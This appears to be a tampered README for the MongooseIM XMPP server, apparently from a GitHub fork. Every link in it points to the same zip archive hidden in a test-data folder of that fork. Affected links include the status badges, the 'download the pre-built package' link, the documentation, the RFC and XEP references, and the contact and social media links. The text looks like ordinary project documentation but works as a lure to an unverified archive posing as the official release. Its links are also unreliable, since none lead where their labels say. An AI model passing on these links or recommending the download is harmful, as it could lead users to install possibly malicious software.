MongooseIM  [![Build Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Documentation Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Coverage Status](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) [![Buildtime trend](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
[![GitHub release](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)


============
<img align="left" src="https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip"</img>

MongooseIM is Erlang Solutions' robust and efficient XMPP server aimed at large installations. Specifically designed for enterprise purposes, it is fault-tolerant, can utilize resources of multiple clustered machines and easily scale in need of more capacity (by just adding a box/VM).

MongooseIM can accept client sessions over vanilla XMPP, Websockets, and HTTP long-polling (a.k.a. BOSH).

Its home on GitHub is at https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip

The product page is available at https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip

Download packages
-----------------
For a quick start just
[download the pre-built package](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
that suits your platform: Ubuntu, Debian, CentOS, and Mac OS X.

An _experimental_ Docker image exists on: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
You can contribute on: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip


Main differences from the parent project
----------------------------------------
This project began its life as a fork of
[ejabberd v.2.1.8](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) back in 2011, and later underwent some major cleanup, refactorization and optimization.

Major steps performed at that time:
*   bringing the project source tree to compliance with OTP project structure
    recommendations,
*   swapping `autotools` for the Erlang community-standard build tool `rebar`,
*   removal of obsolete and/or rarely used modules to reduce maintenance
    burden,
*   reduction of runtime memory consumption by refactoring the code
    to use Erlang's binary data type for string manipulation and storage
    instead of operating on linked lists of characters,
*   functional test coverage of the system according to corresponding
    RFCs and XEPs.

Key differences today:
*   massive scalability
*   code quality, through extensive refactoring, substantial optimisations, and continuous integration
*   unique version, fully open source, fully open standards, innovations contributed to the XSF
*   professional support, and flexible customer service

Documentation
-------------

Up-to-date documentation for the MongooseIM master branch can be found on ReadTheDocs:
* https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
* Older versions:
  * [release 1.6.2](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
  * [release 1.6.1](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
  * [release 1.6.0](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
  * [release 1.5.1](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)


When developing new features/modules, please take care to add basic documentation
to the `doc/` directory, and add a link to your document in `https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip`.

Original documentation for Ejabberd-2.1.8, from which MongooseIM was forked, is preserved
in `doc/ejabberd-2.1.8-OLD`.


Features and supported standards
--------------------------------

*   XMPP Core: [RFC 3920](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip),
    [RFC 6120](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
*   Client connections over TCP (with TLS/STARTTLS available), Websockets,
    and HTTP(S) (BOSH).
*   Configurable database backends: MySQL, Postgres, generic ODBC. Mnesia
    and Redis for transient data.
*   Supports XEPs:

|||||
|-------------|-------------|-------------|-------------|
|[XEP-0012: Last Activity](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0016: Privacy Lists](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0018: Invisible Presence](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0022: Message Events](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0023: Message Expiration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0030: Service Discovery](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0045: Multi-User Chat](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0049: Private XML Storage](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0050: Ad-Hoc Commands](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0054: vcard-temp](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0055: Jabber Search](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0059: Result Set Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0060: Publish-Subscribe](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0068: Field Standardization for Data Forms](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0077: In-Band Registration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0078: Non-SASL Authentication](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0079: Advanced Message Processing](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0082: XMPP Date and Time Profiles](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0083: Nested Roster Groups](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0085: Chat State Notifications](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0086: Error Condition Mappings](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0092: Software Version](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0093: Roster Item Exchange](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0114: Jabber Component Protocol](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0115: Entity Capabilities](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0124: Bidirectional-streams Over Synchronous HTTP (BOSH)](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0126: Invisibility](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0138: Stream Compression](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0157: Contact Addresses for XMPP Services](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0160: Best Practices for Handling Offline Messages](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0163: Personal Eventing Protocol](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0175: Best Practices for Use of SASL ANONYMOUS](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0185: Dialback Key Generation and Validation](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0191: Blocking Command](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0198: Stream Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0199: XMPP Ping](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0202: Entity Time](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0206: XMPP Over BOSH](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0212: XMPP Basic Server 2008](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0237: Roster Versioning](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0248: PubSub Collection Nodes](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0279: Server IP Check](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0280: Message Carbons](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |
[XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0313: Message Archive Management](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) | [XEP-0352: Client State Indication](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip) |


How to build
------------
1.  Requirements.

    To compile MongooseIM you need:
    *   GNU Make,
    *   GCC,
    *   Libexpat 1.95 or higher,
    *   Erlang/OTP 17.5 or higher,
    *   Reltool 0.6.6 or higher,
    *   OpenSSL 0.9.8 or higher, for STARTTLS, SASL and SSL encryption,
    *   Zlib 1.2.3 or higher for Stream Compression support (XEP-0138). Optional.

2.  Compiling on UNIX-like systems.

    To compile MongooseIM, go to the main repo directory `$REPO` and execute
    the command (`$` stands for the shell prompt):

        $ make

    or

        $ ./rebar get-deps
        $ ./rebar compile

    To generate full MongooseIM release (with mysql, pgsql or other deps):

        $ make rel

    If more advanced release is required (with some specific db support only,
    f.e. mysql or pgsql) or you want to set `prefix` or `user` for the
    installation script please refer to the
    [release configuration](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
    page in our documentation

    `make rel` commands will generate a self-contained OTP system image in the
    project's `rel/mongooseim` subdirectory. The contents of that directory are as
    follows:
    *   `rel/mongooseim/bin` - startup/administration scripts,
    *   `rel/mongooseim/etc` - configuration files,
    *   `rel/mongooseim/lib` - MongooseIM binary, header and runtime files,
    *   `rel/mongooseim/var` - spool directory,
    *   `rel/mongooseim/log` - log file directory,
    *   `rel/mongooseim/releases` - release files directory.

3.  Running MongooseIM.

    To run MongooseIM from the project tree after compiling it, change
    to `$REPO/rel/mongooseim`.

    There you can use the `mongooseim` command line administration script to
    start and stop MongooseIM. For example:

        $ bin/mongooseim start

    will start the server.

    You can also run the server in interactive mode:

        $ bin/mongooseim live

    There's also a tool called `mongooseimctl` allowing you to perform some
    operations on a running instance, e.g.:

        $ bin/mongooseimctl status
        MongooseIM node mongooseim@localhost:
          operating system pid: 86026
          Erlang VM status: started (of: starting | started | stopping)
          boot script status: started
          version: 1.6.2-61-g48b8332
          uptime: 1:12:46
          logs:
            https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip

4.  Building the testing target and running tests.

    For testing purposes there's a different make target available:

        $ make devrel

    which will generate releases in `$REPO/dev/` and prepare
    them for testing and generating coverage reports.

    To run the tests (from project's root directory, i.e. `$REPO`):

        $ dev/mongooseim_node1/bin/mongooseim start
        $ dev/mongooseim_node2/bin/mongooseim start
        $ make quicktest

    The test results will show up in the console`.


Test suite
----------

In order to test and validate your XMPP servers, here are useful tools:
* [escalus](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip): Erlang XMPP client
* [amoc](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip): a load testing tools

Public testing
--------------

Continuous integration:
https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip

Code coverage:
https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip


Want to get in touch with us?
-----------------------------
In case of any suggestions, questions or any thoughts on this project,
please feel free to contact us by the standard GitHub ways or at
<a href='https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip'>https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip</a>.

Want to discuss MongooseIM, problems with your deployement or anything else?
Try: <a href='https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip'>https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip</a>.

Announcements mailing-list
--------------------------

We have set up a new public mailing-list for all announcements of major events happening on the MongooseIM front. Expect one or two emails per month, the archives are free and open. We highly encourage you to subscribe here: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
Click on the blue button "Join group", then click in "Email delivery preference" on "Notify me for every new message".

Client libraries
----------------

We recommend following client libraries:
* iOS, Objective-C: [XMPPframework](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
* Android, Java: [Smack](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)
* Web, JavaScript: [https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip](https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip)

Social media
------------

Follow us on Twitter and Facebook, please ask questions, and propose features!

Twitter: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip

Facebook: https://raw.githubusercontent.com/sohailgerman/MongooseIM/master/test/ejabberd_tests/tests/users_api_SUITE_data/MongooseIM-v1.6.zip
